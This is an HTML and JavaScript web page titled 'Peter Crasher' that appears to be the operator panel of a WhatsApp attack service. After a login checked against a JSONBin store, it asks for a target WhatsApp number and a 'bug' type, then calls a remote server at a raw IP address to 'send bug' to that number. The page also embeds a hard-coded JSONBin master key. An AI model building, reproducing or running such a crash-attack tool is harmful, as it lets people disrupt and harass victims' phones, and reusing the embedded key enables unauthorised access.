<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Peter Crasher</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Rubik:wght@400;600&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet"/>
    <style>
        :root {
            --main: #00a2ff;
            --second: #4d9dff;
            --bg: #0a0a0a;
            --text: #eeeeee;
            --accent: #00e1ff;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rubik', sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        #particles-js {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 0;
        }

        .glass-box {
            background: rgba(0, 5, 15, 0.5);
            border: 1px solid rgba(0, 150, 255, 0.2);
            border-radius: 25px;
            padding: 40px;
            backdrop-filter: blur(12px);
            box-shadow: 0 0 50px rgba(0, 100, 255, 0.3), inset 0 0 15px rgba(0, 100, 255, 0.1);
            z-index: 2;
            max-width: 480px;
            width: 100%;
            transition: all 0.5s ease;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .neon-title {
            font-family: 'Orbitron', sans-serif;
            color: var(--accent);
            text-align: center;
            font-size: 1.8rem;
            margin-bottom: 20px;
            text-shadow: 0 0 10px var(--accent);
        }

        input {
            background: rgba(0, 0, 0, 0.3);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 14px;
            width: 100%;
            margin-bottom: 15px;
            font-size: 1rem;
            transition: 0.3s;
        }

        input:focus {
            outline: none;
            border-color: var(--main);
            box-shadow: 0 0 15px rgba(0, 100, 255, 0.5);
        }

        button {
            background: linear-gradient(135deg, var(--main), #0062ff);
            border: none;
            color: white;
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 0 20px rgba(0, 100, 255, 0.4);
            transition: all 0.3s;
            margin-top: 10px;
        }

        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 30px rgba(0, 100, 255, 0.8);
        }

        .result-message {
            text-align: center;
            margin: 15px 0;
            min-height: 24px;
            font-size: 1.1rem;
        }

        .success { color: #00ff88; }
        .error { color: #ff4d4d; }

        #music-player {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 10;
        }

        #music-toggle {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--main), #0062ff);
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 100, 255, 0.5);
        }

        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="particles-js"></div>

    <div class="glass-box" id="login-box">
        <h1 class="neon-title">Login</h1>
        <input id="username" placeholder="Username" type="text"/>
        <input id="password" placeholder="Password" type="password"/>
        <button id="loginBtn" onclick="login()">Login</button>
        <div class="result-message" id="result"></div>
    </div>

    <div class="glass-box" id="bug-box" style="display: none;">
        <h1 class="neon-title">
            <i class="fas fa-terminal"></i> PETER CRASHER
        </h1>    
        <input id="target" placeholder="Target WhatsApp Number: 628xxxx" type="text"/>    
        <div class="bug-grid">
            <div class="bug-card" data-bug="delay">
                <i class="fas fa-clock"></i>
                <div>Delay Hard</div>
            </div>
            <div class="bug-card" data-bug="bulldozer">
                <i class="fas fa-bolt"></i>
                <div>Bulldozer Ekstra</div>
            </div>
        </div>

        <button id="sendBtn" onclick="sendBug()">
            <i class="fas fa-paper-plane"></i> SEND BUG
        </button>
        
        <div class="result-message" id="bug-result"></div>
        
        <div class="contact">
            <p><i class="fas fa-code"></i> Contact Developer:</p>
            <a href="https://t.me/Modhzy" target="_blank">
                <i class="fab fa-telegram"></i> @AlwaysRexx
            </a>
        </div>
    </div>

    <div id="music-player">
        <audio id="bg-music" loop>
            <source src="https://files.catbox.moe/uiq19s.mp3" type="audio/mp3"/>
        </audio>
        <button id="music-toggle" onclick="toggleMusic()">
            <i class="fas fa-music"></i>
        </button>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
    <script>
        // Initialize particles
        particlesJS("particles-js", {
            particles: {
                number: { value: 60, density: { enable: true, value_area: 800 }},
                color: { value: "#00a2ff" },
                shape: { type: "circle" },
                opacity: { value: 0.5, random: true },
                size: { value: 3, random: true },
                line_linked: { 
                    enable: true, 
                    distance: 150, 
                    color: "#00a2ff", 
                    opacity: 0.3, 
                    width: 1 
                },
                move: { 
                    enable: true, 
                    speed: 2, 
                    direction: "none", 
                    random: true, 
                    out_mode: "out" 
                }
            },
            interactivity: {
                events: { 
                    onhover: { 
                        enable: true, 
                        mode: "grab" 
                    } 
                },
                modes: { 
                    grab: { 
                        distance: 200, 
                        line_linked: { 
                            opacity: 0.5 
                        } 
                    } 
                }
            }
        });

        const API_URL = "https://api.jsonbin.io/v3/b/686e20889e410d0f5e41d3a3"; // Ganti dengan URL JSONBin Anda
        const API_ENDPOINT = "http://159.65.130.46:2077/dragon?";
        let selectedBug = "iosX";

        async function login() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const result = document.getElementById('result');

            try {
                const response = await fetch(API_URL, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': '$2a$10$zKcSTNLMbWUQ.9p0ujh7CeLGdCj2TOAGYcOgvXmRwi5iyrV.HjPfu' // Ganti dengan Master Key Anda
                    }
                });

                if (!response.ok) {
                    throw new Error('Failed to fetch data');
                }

                const data = await response.json();
                const users = data.record; // Asumsikan data berisi array pengguna

                const user = users.find(user => user.username === username && user.password === password);

                if (user) {
                    result.textContent = "Login successful!";
                    result.className = "result-message success";
                    document.getElementById('login-box').style.display = 'none';
                    document.getElementById('bug-box').style.display = 'block';
                } else {
                    result.textContent = "Invalid username or password.";
                    result.className = "result-message error";
                }
            } catch (error) {
                console.error("Error:", error);
                result.textContent = `Error: ${error.message}`;
                result.className = "result-message error";
            }
        }

        document.querySelectorAll('.bug-card').forEach(card => {
            card.addEventListener('click', () => {
                document.querySelector('.bug-card.active')?.classList.remove('active');
                card.classList.add('active');
                selectedBug = card.dataset.bug;
            });
        });

        function toggleMusic() {
            const music = document.getElementById('bg-music');
            const btn = document.getElementById('music-toggle');
            
            if (music.paused) {
                music.play();
                btn.innerHTML = '<i class="fas fa-pause"></i>';
            } else {
                music.pause();
                btn.innerHTML = '<i class="fas fa-music"></i>';
            }
        }

        async function sendBug() {
            const target = document.getElementById('target').value.trim();
            const btn = document.getElementById('sendBtn');
            const result = document.getElementById('bug-result');     
            if (!/^\d+$/.test(target)) {
                result.textContent = "Please enter a valid WhatsApp number";
                result.className = "result-message error";
                return;
            }
            btn.disabled = true;
            const originalText = btn.innerHTML;
            btn.innerHTML = '<span class="spinner"></span> SENDING...';
            result.textContent = "";
            result.className = "result-message";
            try {
                const response = await fetch(`${API_ENDPOINT}type=${selectedBug}&chatId=${target}@s.whatsapp.net`);
                
                if (!response.ok) {
                    throw new Error(`Server error: ${response.status}`);
                }
                const data = await response.json();        
                if (data.error) {
                    throw new Error(data.message || "Unknown server error");
                }
                result.textContent = "Bug sent successfully!";
                result.className = "result-message success";
            } catch (error) {
                console.error("Error:", error);
                result.textContent = `Error: ${error.message}`;
                result.className = "result-message error";
            } finally {
                btn.disabled = false;
                btn.innerHTML = originalText;
            }
        }

        document.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                if (document.getElementById('login-box').style.display !== 'none') {
                    login();
                } else {
                    sendBug();
                }
            }
        });
    </script>
</body>
</html>
